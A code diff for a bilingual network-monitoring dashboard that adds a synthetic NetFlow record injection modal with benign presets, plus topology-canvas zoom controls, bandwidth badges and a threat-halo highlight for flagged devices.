+                  {isZh ? '所有採樣介面皆以 1:100/1:500 硬體 ASIC 採樣執行' : 'Hardware ASIC flow sampling enabled'}
+                </span>
+                <button
+                  onClick={() => setInterfacesModalOpen(false)}
+                  className="px-5 py-2 bg-gray-800 hover:bg-gray-700 text-white rounded-xl text-xs font-bold transition-colors"
+                >
+                  {isZh ? '關閉' : 'Close'}
+                </button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+
+        {/* Custom Synthetic Flow Injection Modal */}
+        {injectModalOpen && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
+            <motion.div
+              initial={{ scale: 0.95, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.95, opacity: 0 }}
+              className="w-full max-w-lg bg-[#111114] border border-gray-800 rounded-3xl overflow-hidden shadow-2xl"
+            >
+              <div className="p-5 border-b border-gray-800 flex items-center justify-between bg-[#0d0d10]">
+                <div className="flex items-center gap-3">
+                  <div className="p-2.5 bg-amber-600/10 border border-amber-500/20 rounded-2xl text-amber-400">
+                    <Zap size={22} />
+                  </div>
+                  <div>
+                    <h3 className="text-base font-black text-white">
+                      {isZh ? '自訂 NetFlow 測試流量注入' : 'Inject Synthetic NetFlow Record'}
+                    </h3>
+                    <p className="text-xs text-gray-400 font-mono mt-0.5">
+                      {isZh ? '手動注入流量記錄至收集器進行拓撲聯動驗證' : 'Simulate flow ingestion into real-time collector buffer'}
+                    </p>
+                  </div>
+                </div>
+                <button
+                  onClick={() => setInjectModalOpen(false)}
+                  className="p-1.5 hover:bg-gray-800 rounded-xl text-gray-400 hover:text-white transition-colors"
+                >
+                  <X size={18} />
+                </button>
+              </div>
+
+              <div className="p-5 space-y-4 text-xs">
+                {/* Presets */}
+                <div>
+                  <span className="text-[10px] text-gray-500 font-bold uppercase tracking-wider block mb-1.5">
+                    {isZh ? '常用樣板預設值：' : 'Quick Presets:'}
+                  </span>
+                  <div className="flex flex-wrap gap-2">
+                    <button
+                      type="button"
+                      onClick={() => setInjectFlowData({
+                        srcIp: '10.88.88.106',
+                        srcPort: 48201,
+                        srcDeviceId: 'ws-rd-02',
+                        srcDeviceName: 'RD-Engineer-WS02',
+                        dstIp: '10.88.88.10',
+                        dstPort: 443,
+                        dstDeviceId: 'srv-app-01',
+                        dstDeviceName: 'Web-App-Cluster-01',
+                        protocol: 'HTTPS',
+                        bytes: 28400,
+                        packets: 48,
+                        threatLevel: 'normal'
+                      })}
+                      className="px-2.5 py-1 bg-gray-800/80 hover:bg-gray-800 text-gray-300 rounded-lg text-[11px] font-bold border border-gray-700"
+                    >
+                      🌐 HTTPS Web API
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => setInjectFlowData({
+                        srcIp: '10.88.99.10',
+                        srcPort: 49100,
+                        srcDeviceId: 'scada-hmi-01',
+                        srcDeviceName: 'SCADA-HMI-Master',
+                        dstIp: '10.88.99.20',
+                        dstPort: 502,
+                        dstDeviceId: 'plc-turb-01',
+                        dstDeviceName: 'Turbine-Controller-PLC',
+                        protocol: 'Modbus',
+                        bytes: 4200,
+                        packets: 14,
+                        threatLevel: 'normal'
+                      })}
+                      className="px-2.5 py-1 bg-gray-800/80 hover:bg-gray-800 text-gray-300 rounded-lg text-[11px] font-bold border border-gray-700"
+                    >
+                      ⚙️ SCADA Modbus PLC
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => setInjectFlowData({
+                        srcIp: '10.88.88.105',
+                        srcPort: 53100,
+                        srcDeviceId: 'ws-fin-05',
+                        srcDeviceName: 'Finance-Lead-WS05',
+                        dstIp: '10.88.88.2',
+                        dstPort: 53,
+                        dstDeviceId: 'srv-dns-01',
+                        dstDeviceName: 'Core-DNS-Server',
+                        protocol: 'DNS',
+                        bytes: 1400,
+                        packets: 4,
+                        threatLevel: 'normal'
+                      })}
+                      className="px-2.5 py-1 bg-gray-800/80 hover:bg-gray-800 text-gray-300 rounded-lg text-[11px] font-bold border border-gray-700"
+                    >
+                      🔍 DNS Query
+                    </button>
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-2 gap-3">
+                  <div>
+                    <label className="text-[10px] text-gray-500 font-bold block mb-1">{isZh ? '來源 IP (Source IP)' : 'Source IP'}</label>
+                    <input
+                      type="text"
+                      value={injectFlowData.srcIp}
+                      onChange={(e) => setInjectFlowData(prev => ({ ...prev, srcIp: e.target.value }))}
+                      className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono text-xs focus:outline-none focus:border-blue-500"
+                    />
+                  </div>
+                  <div>
+                    <label className="text-[10px] text-gray-500 font-bold block mb-1">{isZh ? '來源 Port' : 'Source Port'}</label>
+                    <input
+                      type="number"
+                      value={injectFlowData.srcPort}
+                      onChange={(e) => setInjectFlowData(prev => ({ ...prev, srcPort: Number(e.target.value) }))}
+                      className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono text-xs focus:outline-none focus:border-blue-500"
+                    />
+                  </div>
+                  <div>
+                    <label className="text-[10px] text-gray-500 font-bold block mb-1">{isZh ? '目的 IP (Destination IP)' : 'Destination IP'}</label>
+                    <input
+                      type="text"
+                      value={injectFlowData.dstIp}
+                      onChange={(e) => setInjectFlowData(prev => ({ ...prev, dstIp: e.target.value }))}
+                      className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono text-xs focus:outline-none focus:border-blue-500"
+                    />
+                  </div>
+                  <div>
+                    <label className="text-[10px] text-gray-500 font-bold block mb-1">{isZh ? '目的 Port' : 'Destination Port'}</label>
+                    <input
+                      type="number"
+                      value={injectFlowData.dstPort}
+                      onChange={(e) => setInjectFlowData(prev => ({ ...prev, dstPort: Number(e.target.value) }))}
+                      className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono text-xs focus:outline-none focus:border-blue-500"
+                    />
+                  </div>
+                  <div>
+                    <label className="text-[10px] text-gray-500 font-bold block mb-1">{isZh ? '協定 (Protocol)' : 'Protocol'}</label>
+                    <select
+                      value={injectFlowData.protocol}
+                      onChange={(e) => setInjectFlowData(prev => ({ ...prev, protocol: e.target.value }))}
+                      className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono text-xs focus:outline-none focus:border-blue-500"
+                    >
+                      <option value="HTTPS">HTTPS</option>
+                      <option value="HTTP">HTTP</option>
+                      <option value="TCP">TCP</option>
+                      <option value="UDP">UDP</option>
+                      <option value="DNS">DNS</option>
+                      <option value="SSH">SSH</option>
+                      <option value="Modbus">Modbus (ICS)</option>
+                      <option value="S7Comm">S7Comm (ICS)</option>
+                    </select>
+                  </div>
+                  <div>
+                    <label className="text-[10px] text-gray-500 font-bold block mb-1">{isZh ? '傳輸量 (Bytes)' : 'Bytes'}</label>
+                    <input
+                      type="number"
+                      value={injectFlowData.bytes}
+                      onChange={(e) => setInjectFlowData(prev => ({ ...prev, bytes: Number(e.target.value) }))}
+                      className="w-full bg-black/40 border border-gray-800 rounded-xl px-3 py-2 text-white font-mono text-xs focus:outline-none focus:border-blue-500"
+                    />
+                  </div>
+                </div>
+              </div>
+
+              <div className="p-4 border-t border-gray-800 bg-[#0d0d10] flex justify-between items-center">
+                <button
+                  type="button"
+                  onClick={() => setInjectModalOpen(false)}
+                  className="px-4 py-2 bg-gray-800 hover:bg-gray-700 text-gray-300 rounded-xl text-xs font-bold transition-colors"
+                >
+                  {isZh ? '取消' : 'Cancel'}
+                </button>
+                <button
+                  type="button"
+                  onClick={handleInjectSampleFlow}
+                  className="px-5 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-xs font-black transition-all flex items-center gap-2 shadow-lg shadow-blue-600/30"
+                >
+                  <Zap size={14} />
+                  <span>{isZh ? '注入收集佇列' : 'Inject Flow Record'}</span>
                 </button>
               </div>
             </motion.div>
@@ -1822,16 +3772,40 @@ function NetworkTopologyCanvas({
   connections,
   selectedDeviceId,
   onSelectDevice,
+  showFlowAnimation = true,
+  showBandwidthBadges = true,
+  showThreatHalo = true,
+  flows = [],
+  onSelectLink,
   isZh
 }: {
   devices: NetworkDevice[];
   connections: NetworkConnection[];
   selectedDeviceId: string | null;
   onSelectDevice: (device: NetworkDevice | null) => void;
+  showFlowAnimation?: boolean;
+  showBandwidthBadges?: boolean;
+  showThreatHalo?: boolean;
+  flows?: NetworkFlowRecord[];
+  onSelectLink?: (link: any) => void;
   isZh: boolean;
 }) {
   const svgRef = useRef<SVGSVGElement>(null);
   const containerRef = useRef<HTMLDivElement>(null);
+  const zoomBehaviorRef = useRef<any>(null);
+
+  // Zoom control buttons
+  const handleZoom = (scaleFactor: number) => {
+    if (!svgRef.current || !zoomBehaviorRef.current) return;
+    const svg = d3.select(svgRef.current);
+    svg.transition().duration(300).call(zoomBehaviorRef.current.scaleBy, scaleFactor);
+  };
+
+  const handleResetZoom = () => {
+    if (!svgRef.current || !zoomBehaviorRef.current) return;
+    const svg = d3.select(svgRef.current);
+    svg.transition().duration(400).call(zoomBehaviorRef.current.transform, d3.zoomIdentity);
+  };
 
   useEffect(() => {
     if (!svgRef.current || devices.length === 0) return;
@@ -1871,12 +3845,27 @@ function NetworkTopologyCanvas({
     feMerge.append('feMergeNode').attr('in', 'coloredBlur');
     feMerge.append('feMergeNode').attr('in', 'SourceGraphic');
 
+    // Red threat glow
+    const threatFilter = defs.append('filter')
+      .attr('id', 'threat-glow')
+      .attr('x', '-50%')
+      .attr('y', '-50%')
+      .attr('width', '200%')
+      .attr('height', '200%');
+    threatFilter.append('feGaussianBlur')
+      .attr('stdDeviation', '6')
+      .attr('result', 'coloredBlur');
+    const tMerge = threatFilter.append('feMerge');
+    tMerge.append('feMergeNode').attr('in', 'coloredBlur');
+    tMerge.append('feMergeNode').attr('in', 'SourceGraphic');
+
     const g = svg.append('g');
 
     // Zoom behavior
     const zoom = d3.zoom().on('zoom', (event) => {
       g.attr('transform', event.transform);
     });
+    zoomBehaviorRef.current = zoom;
     svg.call(zoom as any);
 
     // Render Links
@@ -1884,10 +3873,35 @@ function NetworkTopologyCanvas({
     const link = linkGroup.selectAll('line')
       .data(links)
       .enter().append('line')
-      .attr('stroke', (d: any) => d.type === 'fiber' ? '#3b82f6' : '#4b5563')
+      .attr('stroke', (d: any) => d.type === 'fiber' ? '#3b82f6' : d.type === 'trunk' ? '#8b5cf6' : '#4b5563')
       .attr('stroke-width', (d: any) => d.type === 'fiber' ? 2.5 : 1.5)
-      .attr('stroke-dasharray', (d: any) => d.type === 'wireless' ? '4,4' : 'none')
-      .attr('opacity', 0.6);
+      .attr('stroke-dasharray', (d: any) => {
+        if (showFlowAnimation) return '6,4';
+        return d.type === 'wireless' ? '4,4' : 'none';
+      })
+      .attr('opacity', 0.65)
+      .attr('cursor', 'pointer')
+      .on('click', (event, d: any) => {
+        event.stopPropagation();
+        if (onSelectLink) onSelectLink(d);
+      });
+
+    // Optional link bandwidth badges
+    let linkBadges: any;
+    if (showBandwidthBadges) {
+      const badgeGroup = g.append('g').attr('class', 'link-badges');
+      linkBadges = badgeGroup.selectAll('text')
+        .data(links)
+        .enter().append('text')
+        .attr('text-anchor', 'middle')
+        .attr('dy', -5)
+        .attr('fill', '#94a3b8')
+        .attr('font-size', '9px')
+        .attr('font-family', 'monospace')
+        .attr('font-weight', '600')
+        .attr('pointer-events', 'none')
+        .text((d: any) => `${d.speed} (${d.utilization}%)`);
+    }
 
     // Render Nodes
     const nodeGroup = g.append('g').attr('class', 'nodes');
@@ -1903,6 +3917,24 @@ function NetworkTopologyCanvas({
         event.stopPropagation();
         onSelectDevice(d);
       });
+
+    // Threat Halo Beacons (Outer pulsing ring if device has malicious flows or warning)
+    if (showThreatHalo) {
+      node.each(function(d: any) {
+        const hasMalFlow = flows.some(f => (f.srcDeviceId === d.id || f.dstDeviceId === d.id) && f.threatLevel === 'malicious' && f.status === 'active');
+        if (hasMalFlow || d.status === 'warning') {
+          d3.select(this)
+            .append('circle')
+            .attr('r', 36)
+            .attr('fill', 'none')
+            .attr('stroke', hasMalFlow ? '#ef4444' : '#f59e0b')
+            .attr('stroke-width', 2)
+            .attr('stroke-dasharray', '4,3')
+            .attr('opacity', 0.8)
+            .attr('filter', 'url(#threat-glow)');
+        }
+      });
+    }
 
     // Outer Circle (Glow & Status Ring)
     node.append('circle')
@@ -1975,6 +4007,12 @@ function NetworkTopologyCanvas({
         .attr('x2', (d: any) => d.target.x)
         .attr('y2', (d: any) => d.target.y);
 
+      if (linkBadges) {
+        linkBadges
+          .attr('x', (d: any) => (d.source.x + d.target.x) / 2)
+          .attr('y', (d: any) => (d.source.y + d.target.y) / 2);
+      }
+
       node.attr('transform', (d: any) => `translate(${d.x},${d.y})`);
     });
 
@@ -2003,7 +4041,7 @@ function NetworkTopologyCanvas({
     return () => {
       simulation.stop();
     };
-  }, [devices, connections, selectedDeviceId, onSelectDevice]);
+  }, [devices, connections, selectedDeviceId, onSelectDevice, showFlowAnimation, showBandwidthBadges, showThreatHalo, flows, onSelectLink]);
 
   return (
     <div ref={containerRef} className="w-full bg-[#0a0a0c] border border-gray-800 rounded-3xl overflow-hidden relative min-h-[620px] shadow-2xl">
@@ -2029,17 +4067,42 @@ function NetworkTopologyCanvas({
         </div>
       </div>
 
+      {/* Floating Canvas Controls HUD (Zoom In / Zoom Out / Reset Center) */}
+      <div className="absolute top-5 right-5 z-10 flex items-center gap-1.5 bg-[#111114]/90 backdrop-blur-md border border-gray-800 p-1.5 rounded-2xl shadow-xl">
+        <button
+          onClick={() => handleZoom(1.25)}
+          className="p-2 hover:bg-gray-800 text-gray-300 hover:text-white rounded-xl transition-colors"
+          title={isZh ? '放大畫布' : 'Zoom In'}
+        >
+          <ZoomIn size={15} />
+        </button>
+        <button
+          onClick={() => handleZoom(0.8)}
+          className="p-2 hover:bg-gray-800 text-gray-300 hover:text-white rounded-xl transition-colors"
+          title={isZh ? '縮小畫布' : 'Zoom Out'}
+        >
+          <ZoomOut size={15} />
+        </button>
+        <button
+          onClick={handleResetZoom}
+          className="p-2 hover:bg-gray-800 text-gray-300 hover:text-white rounded-xl transition-colors"
+          title={isZh ? '重置畫布至中央' : 'Reset View'}
+        >
+          <Crosshair size={15} />
+        </button>
+      </div>
+
       {/* Control Tips */}
       <div className="absolute bottom-5 right-5 z-10">
         <div className="p-3.5 bg-[#111114]/90 backdrop-blur-md border border-blue-500/20 rounded-2xl shadow-xl space-y-1">
           <div className="flex items-center gap-2">
             <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse" />
             <span className="text-xs font-black text-blue-400">
-              {isZh ? '即時力導向拓撲引擎運作中' : 'Topology Engine Active'}
+              {isZh ? '次世代力導向拓撲與 NetFlow 引擎運作中' : 'Topology & NetFlow Active'}
             </span>
           </div>
           <p className="text-[11px] text-gray-400">
-            {isZh ? '點擊節點展開詳細探針資訊 • 拖曳節點重構佈局 • 滾輪縮放畫布' : 'Click node to inspect • Drag to reorder • Scroll to zoom'}
+            {isZh ? '點擊節點檢視主機 Telemetry 與活躍流量 • 點擊鏈路檢視頻寬與行經 Session • 拖曳節點重構佈局' : 'Click node/link to inspect • Drag to reorder • Scroll to zoom'}
           </p>
         </div>
       </div>
